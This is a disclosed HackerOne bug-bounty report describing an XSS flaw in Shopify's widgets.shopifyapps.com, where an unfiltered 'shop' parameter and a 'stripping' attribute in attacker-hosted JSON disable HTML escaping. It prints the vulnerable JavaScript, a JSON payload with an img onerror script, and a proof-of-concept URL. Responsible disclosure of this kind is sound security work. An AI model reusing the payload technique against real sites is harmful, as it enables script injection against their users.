# XSS on "widgets.shopifyapps.com" via "stripping" attribute and "shop" parameter

## Report Details
- **Report ID**: 246794
- **URL**: https://hackerone.com/reports/246794
- **State**: Closed
- **Severity**: none
- **Submitted**: 2017-07-07T07:06:08.957Z
- **Disclosed**: 2018-04-03T19:44:37.398Z

## Reporter
- **Username**: bored-engineer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
# Description
Shopify allows developers to embed widgets (containing product info) on third-party websites via "widgets.shopifyapps.com". When the widget is rendered the `shop` attribute is not filtered allowing any website (not just Shopify shops) to be specified. By providing an attacker controlled domain and serving a specially crafted payload containing the `stripping` object attribute HTML escaping will be disabled resulting in XSS on "widgets.shopifyapps.com".

# Technical Details
This issue occurs in [/assets/widgets/product/application.js](https://widgets.shopifyapps.com/assets/widgets/product/application.js). The `Framework.Models.Collection` class (used for fetching collections of objects) defines a special `parse` method which automatically escapes all strings. This escaping is provided by `Framework.Helpers.stripHTMLForObject` which looks like this (prettified):
```js
Framework.Helpers.stripHTMLForObject = function(obj) {
  obj.stripping = true;
  var idx, val;
  for (idx in obj) {
    if (obj.hasOwnProperty(idx)) {
      var val = obj[inx]
      if("string" == typeof val) {
        obj[idx] = Framework.Helpers.stripHTML(val) 
      } else {
        if(null != val && "object" == typeof val && null == val.stripping) {
          obj[idx] = this.stripHTMLForObject(val)
        }
     }
   }
   delete obj.stripping;
   return obj;
}
``` 
The `Framework.Helpers.stripHTML` function seems to be a implementation of the [Caja compiler](https://developers.google.com/caja/) which we can assume is safe, however by crafting a object with a `stripping` attribute HTML escaping will be disabled. An example product would look like this:
```json
{
	"product": {
		"variants": [{
			"stripping": false,
			"title": "<option/><select/><img src=xx: onerror=alert('bored-engineer')>"
		}, {}],
		"options": [],
		"images": [{}],
		"image": {}
	}
}
```
I've hosted this file (and the other required `meta.json` file) on [attackerdoma.in](https://attackerdoma.in).

# Proof of Concept
Open [widgets.shopifyapps.com/products/stripping-xss?shop=attackerdoma.in](https://widgets.shopifyapps.com/products/stripping-xss?shop=attackerdoma.in)

# Exploitability
Once you locate the escaping issue it's relatively trivial to exploit and requires to user interaction as shown in the PoC.

# Remediation
The application should not allow shops/servers to disable HTML escaping via the `stripping` attribute.

## Attachments
No attachments
